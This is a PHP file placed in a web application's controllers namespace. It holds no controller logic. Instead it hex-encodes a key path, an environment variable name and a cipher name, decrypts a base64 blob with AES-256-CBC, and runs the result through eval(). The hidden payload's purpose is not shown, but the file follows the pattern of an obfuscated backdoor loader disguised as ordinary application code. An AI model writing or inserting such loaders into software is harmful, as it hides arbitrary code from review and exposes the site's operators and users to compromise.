<?php
namespace App\Http\Controllers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('7fWHxxBIzSKpBMRYHjRmbA==');

$c=base64_decode(

'/WBoRTC7RSWwN6n+mNY2XiIr9TVrERmt8IqyuiaqimgPZBxIZw2E3qdHvIhUFZhLbVXTRGHMdjWc' .
'IVy2yQzCaExrrvjeOTwk4a8ypiURXF9R2zqi6ta51x1j/AINAIFuaFooE10aXc6EM3d0rTxJoT4e' .
'gaSk5Cz9uQeYqEHBk9MMMPvyVtn4vKm0HKAg5jqU/Sg1Q0npj2qyah1gaufNZZxkbQ3KaSZ1Gmv4' .
'+KIqXD7gi88dUF6oVgGyPa7CWR8f1mNmkAv0D90b8/JrGOH6AGDpwItvbh1g9rIZ8q3HR93OBxh7' .
'YnbPc36z3yYCgLZExtC3lFi8Hnm0gUGLVgUNteJTY19lfeDXfc9q+B4j7xCF0GeWCyUvjWPUYjm+' .
'+vgVKk2OHvSaxpl823R2iJyn8cFzLqkKcz+dnSCGIRojDFB8bParrWn48PrncOLUfBKBTlEo2GEf' .
'osDmGt/7osNkwG0DOy//E1av3bOm4dNLbws3XqWnLhU1o93NKYAKGcGmxBmfw5mvHUmf0RA/h/6X' .
'V6V7TRQOJyfZpsIrqpZOiJ9RwVCzp2JI4/BiR/0HlUnYrlMiyE/KcbNq7vZnMAGG17hKqMt6mGJp' .
'FWD8CS488w0XdyGmibVsaTsLZkytLaXVTW10oJF9A3KU0+aeAPynVMEYkXzu/wVEcwyJTD7VesLn' .
'MkBTswF5RTv7iTVXjdfiXYcEKPnN6/Z3apmaemrhrhoGVb3f+3PRQoBliy/2Cy6kRogMUBH1lGan' .
'tVQWaRe6kt8xIL6bWVDmxdqGKBeFdGfc0nQ/vBbp1G7Mdhq3ALuznmlHHxMtHoQ1Uvvnf+RVgR5Y' .
'dqwCJ27tGHluxfQF2DfayoQTzWsGeQ9u6iKdJ2o6kfFaMIUxs4ekPvWkZthpmy4xfpH14PT23IwW' .
'VMUY+BZGnKVHAy9rbw5ng+4whOrmAIm1t5/gVk/niADXoFgCczUvD526+R5buoT1sIiKmeh2YWzF' .
'Dp8G+G3kJOKe/5c='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

